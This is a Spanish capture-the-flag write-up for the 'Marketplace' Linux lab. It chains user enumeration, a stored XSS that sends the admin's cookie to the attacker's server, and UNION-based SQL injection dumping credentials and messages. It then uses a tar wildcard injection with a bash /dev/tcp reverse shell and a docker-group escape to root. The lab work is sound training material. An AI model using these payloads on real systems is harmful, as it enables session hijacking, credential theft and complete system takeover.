# Marketplace

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una vulnerabilidad **Stored XSS** para secuestrar la sesión del administrador, aprovechar una **SQL Injection UNION-Based** para obtener credenciales SSH y escalar privilegios mediante una **Wildcard Injection** sobre un script de copias de seguridad y el abuso del grupo **docker** hasta obtener acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- FFUF
- Hydra
- Burp Suite
- Stored XSS
- Session Hijacking
- SQL Injection (UNION-Based)
- MySQL
- SSH
- Wildcard Injection
- Tar
- Docker

---

## 🧠 Metodología

La enumeración inicial reveló una máquina Linux con una aplicación web como principal superficie de ataque. Durante el reconocimiento identifiqué un sistema de autenticación vulnerable a **enumeración de usuarios**, aunque los intentos de fuerza bruta no permitieron obtener credenciales válidas.

La estrategia cambió al analizar las funcionalidades disponibles para usuarios registrados. La posibilidad de publicar anuncios permitió descubrir una vulnerabilidad **Stored XSS**, que fue utilizada para robar la cookie de sesión del administrador y obtener acceso al panel administrativo mediante **Session Hijacking**.

Desde dicho panel identifiqué una **SQL Injection UNION-Based**, gracias a la cual fue posible extraer información de la base de datos, incluyendo mensajes privados que contenían credenciales SSH. Tras acceder al sistema, la enumeración local permitió aprovechar un script ejecutable mediante **sudo** vulnerable a **Wildcard Injection**, obteniendo acceso como otro usuario. Finalmente, el abuso del grupo **docker** permitió escapar al sistema anfitrión y conseguir privilegios de **root**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 32768 | HTTP (Node.js) |

La aplicación web del puerto 80 constituía el principal vector de ataque.

---

### 2. Enumeración web

Accedí a la aplicación principal.

```text
http://10.130.161.25
```

Encontré un **Marketplace** con varios anuncios publicados por los usuarios:

- `jake`
- `michael`

Además, la aplicación disponía de un formulario de autenticación.

Durante las pruebas manuales observé una diferencia en los mensajes devueltos por la aplicación.

Para usuarios válidos:

```text
Invalid password
```

Para usuarios inexistentes:

```text
User not found
```

Este comportamiento permitía realizar una **enumeración de usuarios**, confirmando que tanto **jake** como **michael** existían en el sistema.

---

### 3. Descubrimiento de directorios

Realicé un fuzzing de directorios utilizando **FFUF**.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.130.161.25/FUZZ
```

Los recursos encontrados fueron:

- `/admin`
- `/login`
- `/signup`
- `/messages`
- `/new`
- `/stylesheets`
- `/images`

La mayoría redirigían al formulario de autenticación o no aportaban información útil para continuar.

---

### 4. Intento de obtención de credenciales

Intenté obtener acceso mediante un ataque de fuerza bruta utilizando **Hydra**.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.130.161.25 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid password" -V
```

Aunque Hydra devolvió varias posibles coincidencias tanto para **jake** como para **michael**, ninguna permitía autenticarse correctamente.

Fue necesario buscar un vector de ataque alternativo.

---

### 5. Descubrimiento del Stored XSS

Creé una nueva cuenta en la aplicación.

```text
Usuario:
david

Contraseña:
test
```

Tras iniciar sesión observé varias funcionalidades:

- Publicar productos.
- Contactar con vendedores.
- Reportar anuncios.

La posibilidad de publicar nuevos anuncios permitía introducir código HTML y JavaScript.

Como prueba ejecuté:

```html
<script>alert('xss');</script>
```

Al volver a cargar la página el script seguía ejecutándose, confirmando una vulnerabilidad **Stored XSS**.

---

### 6. Secuestro de la sesión del administrador

Preparé un pequeño servidor HTTP en la máquina atacante para capturar cookies.

Posteriormente publiqué un anuncio con el siguiente código:

```html
<script>
image = new Image();
image.src='http://192.168.131.12:8888/?'+document.cookie;
</script>
```

Utilicé la opción:

```text
Report Listing
```

para forzar la revisión del anuncio por parte del administrador.

Cuando el administrador visitó la publicación, su navegador envió automáticamente la cookie de sesión a mi servidor.

Con la cookie obtenida sustituí mi sesión utilizando las herramientas de desarrollo del navegador.

Tras actualizar la página obtuve acceso al:

```text
Panel de Administración
```

Además recuperé la primera flag.

---

### 7. Explotación de la SQL Injection

Dentro del panel observé que la información dependía del parámetro:

```text
/admin?user=2
```

Probando un carácter especial:

```text
'
```

la aplicación devolvía un error de MySQL.

Posteriormente confirmé la vulnerabilidad mediante:

```text
/admin?user=0 UNION SELECT 1,2,3,4
```

La consulta fue aceptada, confirmando una **UNION-Based SQL Injection**.

Comencé enumerando la versión del servidor.

```text
/admin?user=0 UNION SELECT version(),2,3,4
```

Después obtuve el nombre de la base de datos.

```text
/admin?user=0 UNION SELECT database(),2,3,4
```

Enumeré las tablas.

```text
/admin?user=0 UNION SELECT group_concat(table_name),database(),3,4 FROM information_schema.tables WHERE table_schema='marketplace'
```

Y finalmente las columnas de la tabla de usuarios.

```text
/admin?user=0 UNION SELECT group_concat(column_name),database(),3,4 FROM information_schema.columns WHERE table_name='users'
```

---

### 8. Obtención de credenciales SSH

Extraí los usuarios junto con sus hashes.

```text
/admin?user=0 UNION SELECT 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 FROM marketplace.users-- -
```

Posteriormente extraje los mensajes almacenados.

```text
/admin?user=0 UNION SELECT 1,group_concat(message_content,'\n'),3,4 FROM marketplace.messages-- -
```

Entre ellos apareció una contraseña SSH.

```text
@b_ENXkGYUCAv3zJ
```

Probando la contraseña con los usuarios conocidos obtuve acceso mediante:

```bash
ssh jake@10.130.161.25
```

Una vez autenticado recuperé la flag de usuario.


---

### 9. Escalada de privilegios

Comprobé los permisos disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado indicaba que podía ejecutar el siguiente script como el usuario **michael**.

```text
/opt/backups/backup.sh
```

Tras revisar su contenido comprobé que utilizaba `tar` con un comodín (`*`), siendo vulnerable a una **Wildcard Injection**.

Me situé en el directorio correspondiente.

```bash
cd /opt/backups
```

Preparé el payload.

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.168.131.12/4444 0>&1"' > shell.sh
```

Creé los archivos necesarios para la explotación.

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

```bash
echo "" > "--checkpoint=1"
```

Preparé un listener.

```bash
nc -lvnp 4444
```

Y ejecuté el script.

```bash
sudo -u michael /opt/backups/backup.sh
```

Recibí una shell como:

```text
michael
```

Para estabilizar la sesión utilicé:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

---

### 10. Escalada mediante Docker

Comprobé los grupos del usuario.

```bash
id
```

Observé que **michael** pertenecía al grupo:

```text
docker
```

Este grupo permite iniciar contenedores con acceso directo al sistema anfitrión.

Ejecuté:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

Obteniendo inmediatamente una shell con privilegios de:

```text
root
```

---

### 11. Obtención de la flag final

Accedí al directorio del administrador.

```bash
cd /root
```

Leí el archivo:

```bash
cat root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió encadenar varias vulnerabilidades web con técnicas de post-explotación en Linux hasta comprometer completamente el sistema.
- Detectar vulnerabilidades de **User Enumeration** mediante mensajes de autenticación.
- Realizar fuzzing de directorios utilizando **FFUF**.
- Identificar y explotar una vulnerabilidad **Stored XSS**.
- Robar cookies de sesión mediante JavaScript.
- Realizar un **Session Hijacking** sustituyendo la cookie del administrador.
- Identificar y explotar una **UNION-Based SQL Injection**.
- Enumerar bases de datos, tablas y columnas utilizando `information_schema`.
- Extraer credenciales almacenadas en una base de datos.
- Reutilizar credenciales para acceder mediante **SSH**.
- Explotar una **Wildcard Injection** sobre un script que utiliza `tar`.
- Comprender los riesgos asociados al grupo **docker** y su capacidad para obtener privilegios de **root**.
